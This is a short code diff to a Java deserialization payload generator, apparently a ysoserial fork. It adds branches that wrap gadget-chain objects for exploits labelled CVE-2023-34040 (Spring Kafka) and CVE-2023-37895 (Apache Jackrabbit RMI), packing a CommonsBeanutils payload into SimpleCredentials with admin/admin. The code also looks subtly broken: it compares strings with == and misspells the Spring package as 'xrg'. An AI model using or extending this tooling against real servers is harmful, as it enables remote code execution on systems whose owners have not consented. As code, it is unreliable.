@@ -38,12 +38,20 @@ public class GeneratePayload {
 			PrintStream out = System.out;
             try {
                 String szOutClass = System.getenv("OutClassName");
-                if ("" != szOutClass) {
+                // CVE-2023-34040 Spring Kafka Deserialization Remote Code Execution
+                //  xrg.springframework.kafka.support.serializer.DeserializationException
+                if ("xrg.springframework.kafka.support.serializer.DeserializationException" ==szOutClass ){
                     Object val = Class.forName(szOutClass).newInstance();
                     Field valfield = val.getClass().getDeclaredField("foo");
                     Reflections.setAccessible(valfield);
                     valfield.set(val, object);
                     object = val;
+                    // javax.jcr.SimpleCredentials CommonsBeanutils1
+                    // Apache Jackrabbit RMI 远程代码执行漏洞分析(CVE-2023-37895)
+                }else if("javax.jcr.SimpleCredentials" ==szOutClass && -1 < payloadType.indexOf("CommonsBeanutils")){
+                    javax.jcr.SimpleCredentials simpleCredentials = new javax.jcr.SimpleCredentials("admin", "admin".toCharArray());
+                    simpleCredentials.setAttribute("admin", object);
+                    object = simpleCredentials;
                 }
             }catch (Throwable e3) {}
 
